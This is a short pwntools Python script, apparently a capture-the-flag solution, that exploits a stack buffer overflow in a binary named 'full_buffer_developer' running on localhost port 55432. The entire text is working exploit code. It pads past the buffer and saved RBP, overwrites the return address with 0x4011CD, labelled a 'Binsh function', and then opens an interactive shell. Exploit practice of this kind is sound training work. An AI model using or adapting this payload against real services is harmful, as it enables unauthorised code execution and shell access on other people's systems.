from pwn import *

# Start process
# p = process("./full_buffer_developer")
p = remote("localhost", 55432)

# Binsh function
pad = b'a'*0x10
rbp = b'b'*8
win = p64(0x4011CD)

payload = pad+rbp+win

# Easy bof
p.sendlineafter(b':', payload)
p.interactive()
